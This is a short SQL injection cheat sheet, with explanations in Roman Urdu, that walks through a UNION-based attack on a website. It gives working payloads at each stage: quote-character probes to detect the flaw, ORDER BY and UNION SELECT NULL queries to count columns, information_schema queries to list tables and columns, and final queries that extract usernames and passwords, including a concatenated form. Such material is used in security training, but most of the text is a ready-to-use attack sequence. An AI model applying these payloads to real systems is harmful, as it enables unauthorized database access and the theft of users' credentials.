### Basic payload for checking website is vulnerable or not

 `'`

 `"`

 `#` 

---

### Checking How many Columns

` ' ORDER BY 1--`

` ' ORDER BY 2--`

` ' ORDER BY 3--`

Jahan pr website main error ajaye jaisy ` ' ORDER BY 3--` pr too iska matlab 2 columns hain.

### Alternative Method for Checking Columns

` ' UNION SELECT NULL-- `

` ' UNION SELECT NULL,NULL-- `

` ' UNION SELECT NULL,NULL,NULL-- `

Agar ` ' UNION SELECT NULL,NULL-- ` aany pr website py yeh display hoo jaye or baki dono pr error aye too phir yani 2 columns hain.

---

### Checking which column contain text data

` ' UNION SELECT 'abc',NULL,NULL-- `

` ' UNION SELECT NULL,'abc',NULL-- `

` ' UNION SELECT NULL,NULL,'abc'-- `

Jab yeh pata chal jaye ky website main kitny columns hain too iusky baad ka step yeh check krna hota hai ky kis column main text data jaa rha hai isky liye yeh oper wali sub combinations try ki ati hain jis combination pr error na aye yani iusky andar text data jaa rha hai or iusi column sy hum data retrive krty hain.

---

### Checking Table Name

` ' UNION SELECT NULL,table_name FROM information_schema.tables--`

Table or column name ka pata hona bht zyada zaroori hai isky baghair data retrive nhi hoo skta. Database main aik jagah hoti hai jisko information schema kehty hain wahan database ky tables or columns ki information hoti hai, isi jagah sy hum yeh information nikalty hain. Oper di gyi command sy yeh pata chalta hai ky table name kya hai lekin iss sy pehly yeh pata hona zaroori hai jy kitny columns hai oper di gyi command 2 columns ky hissab sy hai agar 3 columns hon too phir yeh command hogi

` ' UNION SELECT NULL,NULL,table_name FROM information_schema.tables--`

Aik or baat yeh ky agar yeh command work na kare too phir column no change kiya jaa skta hai jaisy

` ' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--`

---

### Checking Columns Name

` ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--`

Yeh command table name find krny ky baad daali jati hai iss command sy column name ka pata chalta hai. Jab inn dono ka pata chal jaye too final command aisy banti hai

` ' UNION SELECT username, password FROM users--`

---

### Value Concatenation 

` ' UNION SELECT username || '~' || password FROM users--`

Yeh command taab use hoti hai jab table main sirf aik column hoo or iusi sy dono cheezein nikalwani hon too phir hum iss tarah username or password dono ko combine krty hain iss process ko concatenation kehty hain.

---

Yeh sub commands hi use hoti hain SQL Injection main information gathering ky liye or yeh haar database ky liye thori bht different hoo skti hain.

